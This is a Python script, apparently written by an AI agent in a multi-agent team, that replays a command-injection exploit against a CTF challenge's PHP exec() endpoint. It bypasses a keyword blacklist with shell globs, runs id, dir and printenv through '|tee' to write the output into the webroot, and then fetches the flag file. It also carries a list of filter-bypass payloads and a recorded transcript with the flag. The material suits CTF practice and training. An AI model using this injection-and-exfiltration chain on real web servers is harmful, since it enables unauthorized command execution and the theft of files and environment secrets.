#!/usr/bin/env python3
r"""
solve-converge.py -- lane: CONVERGE (agent-4, task t4 support)

Replayable end-to-end reproduction of the node4:27309 chain, written from
scratch (independent of agent-1's solve-recon.py / agent-2's exploit.py /
agent-3's solve-lane-b.py).

Target : http://node4.anna.nssctf.cn:27309/
Server : Apache/2.4.25 (Debian), PHP/5.6.40 (mod_php)

index.php (leaked by its own highlight_file()):
    <?php
    highlight_file(__FILE__);
    if(isset($_GET['url'])){
        $url=$_GET['url'];
        if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url)){
            echo "Sorry,you can't use this.";
        } else {
            echo "Can you see anything?";
            exec($url);          # blind: child stdout is never echoed
        }
    }

Chain replayed by `run` (fresh exfil filenames, cv1..cv6):
  0. negative control : literal /flllllaaaaaaggggggg is rejected ("la" banned)
  1. channel proof    : pwd|tee cv1.txt      -> /var/www/html (cwd == webroot, writable)
  2. identity         : id|tee cv2.txt       -> uid=33(www-data)
  3. root enumeration : dir /|tee cv3.txt    -> two flag-shaped entries
  4. breadcrumb decoy : nl /a_here_is_a_f1ag|tee cv4.txt -> points at the real file
  5. THE TRICK        : nl /fllll?aaaaaaggggggg|tee cv5.txt -> flag  ('?' dodges "la")
  6. env decoy        : printenv|tee cv6.txt -> FLAG=not_flag, PWD=/var/www/html

Modes:
  python solve-converge.py             # live run (exits 2 with a DOWN notice if unreachable)
  python solve-converge.py selftest    # OFFLINE: filter assertions + glob uniqueness check
  python solve-converge.py expect      # OFFLINE: print the transcript a live run must produce
  python solve-converge.py check CMD   # OFFLINE: simulate the blacklist on one payload
"""
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://node4.anna.nssctf.cn:27309/"
FILTER = re.compile(r'bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|-|\*|"|>|<|%|\$', re.I)
OK_MARK = "Can you see anything?"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ctf-converge"
FLAG_RE = re.compile(r'NSSCTF\{[^}]+\}')

REAL_PATH = "/flllllaaaaaaggggggg"          # 19 chars, contains banned "la" -> untypeable
GLOB_PATH = "/fllll?aaaaaaggggggg"          # same length, one '?' crosses the l/a boundary
BREADCRUMB = "/a_here_is_a_f1ag"


def blocked(cmd):
    """Client-side replica of the server blacklist; returns the hit or None."""
    m = FILTER.search(cmd)
    return m.group(0) if m else None


def http_get(path, timeout=60):
    """(status, text) or ('DOWN', error) -- never raises."""
    req = urllib.request.Request(BASE + path, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001  (connection refused, timeout, DNS, ...)
        return "DOWN", "%s: %s" % (type(e).__name__, e)


def tail_of(body):
    """index.php dumps its own source inside <code>...</code>; only text after the
    LAST </code> is the real verdict. Raw-body string matching is a trap: BOTH the
    blocked and the success literal appear verbatim in the leaked source."""
    idx = body.rfind("</code>")
    return body[idx + len("</code>"):].strip() if idx != -1 else body.strip()


def inject(cmd, expect_ok=True):
    hit = blocked(cmd)
    url = BASE + "?url=" + urllib.parse.quote(cmd, safe="")
    print("    payload : %s" % cmd)
    print("    url     : %s" % url)
    if hit is not None:
        print("    local   : REJECT (contains banned %r) -- per request, not sent" % hit)
        return "local-reject", None
    status, body = http_get("?url=" + urllib.parse.quote(cmd, safe=""))
    if status == "DOWN":
        print("    verdict : TARGET DOWN (%s)" % body)
        return "down", None
    verdict = "ok" if OK_MARK in tail_of(body) else "blocked-by-server"
    print("    verdict : HTTP %s -> %s" % (status, verdict))
    if expect_ok and verdict != "ok":
        print("    !! payload did not execute")
    return verdict, body


def exfil(cmd, name, sleep=0.7):
    """`<cmd>|tee <name>` server-side, then GET /<name> back over HTTP."""
    print("[*] exfil %-28s -> /%s" % (cmd, name))
    verdict, _ = inject("%s|tee %s" % (cmd, name))
    if verdict in ("down", "local-reject"):
        return verdict, ""
    time.sleep(sleep)
    status, body = http_get(name)
    print("    GET /%s : HTTP %s, %d bytes" % (name, status, len(body) if isinstance(body, str) else 0))
    if status == "DOWN":
        return "down", ""
    print("    ---8<---")
    print("\n".join("    " + l for l in body.splitlines()))
    print("    --->8---")
    return status, body


def main():
    print("=" * 74)
    print("node4:27309 converge run -- %s" % BASE)
    print("=" * 74)

    print("\n[0] NEGATIVE CONTROL: the real filename cannot be typed literally")
    inject("nl " + REAL_PATH, expect_ok=False)

    print("\n[1] CHANNEL PROOF: child cwd is the writable webroot")
    st, pwd = exfil("pwd", "cv1.txt")
    if st == "down":
        print("\n!! TARGET DOWN -- no live re-verification possible from this environment.")
        print("!! Every step above is UNVERIFIED here; use the recorded transcripts.")
        return 2

    print("\n[2] IDENTITY")
    _, whoami = exfil("id", "cv2.txt")

    print("\n[3] ROOT ENUMERATION")
    _, root = exfil("dir /", "cv3.txt")

    print("\n[4] BREADCRUMB DECOY")
    _, bread = exfil("nl " + BREADCRUMB, "cv4.txt")

    print("\n[5] THE FLAG (one '?' glob crosses the banned 'la' boundary)")
    _, flagbody = exfil("nl " + GLOB_PATH, "cv5.txt")

    print("\n[6] ENV DECOY")
    _, env = exfil("printenv", "cv6.txt")

    flags = FLAG_RE.findall(flagbody + "\n" + env + "\n" + root)
    print("\n" + "=" * 74)
    print("RESULT")
    print("  cwd          : %s" % pwd.strip())
    print("  identity     : %s" % whoami.strip())
    print("  breadcrumb   : %s" % bread.strip())
    print("  flag line    : %s" % flagbody.strip())
    print("  decoy in env : %s" % ("FLAG=not_flag" if "FLAG=not_flag" in env else "n/a"))
    print("  extracted    : %s" % (flags[0] if flags else "NONE"))
    print("=" * 74)
    return 0 if flags else 1


# --------------------------------------------------------------------------
# offline modes: run without touching the target (instance may be gone)
# --------------------------------------------------------------------------
CASES = [
    # (payload, must_pass?, why)
    ("pwd",                                   True,  "trivially clean"),
    ("id",                                    True,  "trivially clean"),
    ("dir /",                                 True,  "dir is not on the blacklist, no dashes"),
    ("nl " + BREADCRUMB,                      True,  "decoy breadcrumb contains no banned substring"),
    ("nl " + GLOB_PATH,                       True,  "'?' is allowed -> the ONE trick"),
    ("nl " + REAL_PATH,                       False, "contains banned 'la'"),
    ("nl /flag",                              False, "'flag' contains banned 'la'"),
    ("printenv",                              True,  "clean; needed for the env-decoy step"),
    ("printenv FLAG",                         False, "the ARG NAME FLAG contains 'la': the whole chain dies"),
    ("nl " + BREADCRUMB + "|tee cv4.txt",     True,  "tee writer, no redirect needed"),
    (GLOB_PATH + "|tee cv5.txt",              True,  "final read, relative glob path"),
    ("ls -la",                                False, "'ls' banned, and '-' banned everywhere"),
    ("cat /flag",                             False, "'cat' banned and 'la' banned"),
    ("nl -ba " + BREADCRUMB,                  False, "single '-' bans every short option"),
    ("dir *",                                 False, "'*' banned"),
    ("pwd>out.txt",                           False, "'>' banned -> redirect exfil impossible"),
    ("cat${IFS}/flag",                        False, "'$' and '{' tricks killed by '$' ban"),
    ("pwd%00",                                False, "'%' banned"),
]


def selftest():
    print("OFFLINE SELFTEST -- client-side replica of the server blacklist")
    print("regex: /%s/i\n" % FILTER.pattern)
    bad = 0
    for payload, must_pass, why in CASES:
        hit = blocked(payload)
        ok = (hit is None) if must_pass else (hit is not None)
        bad += 0 if ok else 1
        print("  [%s] %-34s -> %s   (%s)"
              % ("PASS" if ok else "FAIL",
                 payload,
                 "accepted" if hit is None else "rejected on %r" % hit,
                 why))

    print("\nGlob uniqueness check (what the server-side shell sees):")
    print("  listing entry : %s  (%d chars)" % (REAL_PATH, len(REAL_PATH)))
    print("  typed payload : %s  (%d chars)" % (GLOB_PATH, len(GLOB_PATH)))
    print("  '?' matches exactly the 5th char 'l'; no other root entry starts with")
    print("  'fllll' + any char + 'aaaaaa', so the match is unique.")
    print("  wrong glob attempt '/flll?laaaaaaggggggg' style variants either keep the")
    print("  banned 'la' substring or fail to match -> only the boundary '?' works.")

    print("\nRESULT: %s (%d failures)" % ("selftest OK" if bad == 0 else "selftest FAILED", bad))
    return 1 if bad else 0


EXPECTED = """\
EXPECTED LIVE TRANSCRIPT (recorded evidence, not a live run)
Every URL is byte-for-byte what was sent while the instance was up.

[request]  GET /?url=dir%20%2F%7Ctee%20cv3.txt          (decoded: dir /|tee cv3.txt)
[fetch]    GET /cv3.txt
           -> a_here_is_a_f1ag  dev               home   media  proc  sbin  tmp
              bin               etc               lib    mnt    root  srv   usr
              boot              flllllaaaaaaggggggg lib64 opt  run   sys   var

[request]  GET /?url=nl%20%2Fa_here_is_a_f1ag%7Ctee%20cv4.txt
[fetch]    GET /cv4.txt    -> true_flag_1s_1n_flllllaaaaaaggggggg

[request]  GET /?url=nl%20%2Ffllll%3Faaaaaaggggggg%7Ctee%20cv5.txt
[fetch]    GET /cv5.txt    ->      1\\tNSSCTF{1ec6ae10-d171-4bee-88db-e6441c5bcd5a}

[request]  GET /?url=printenv%7Ctee%20cv6.txt
[fetch]    GET /cv6.txt    -> FLAG=not_flag (decoy) ... PWD=/var/www/html

[request]  GET /?url=nl%20%2Fflllllaaaaaaggggggg       (literal, 0 exfil files written)
           -> "Sorry,you can't use this."   <- 'la' in the path, whole payload rejected
"""


if __name__ == "__main__":
    if len(sys.argv) > 2 and sys.argv[1] == "check":
        hit = blocked(sys.argv[2])
        print(("REJECTED on %r" % hit) if hit else "PASSES filter")
        sys.exit(0)
    if len(sys.argv) > 1 and sys.argv[1] == "selftest":
        sys.exit(selftest())
    if len(sys.argv) > 1 and sys.argv[1] == "expect":
        sys.stdout.write(EXPECTED)
        sys.exit(0)
    sys.exit(main())
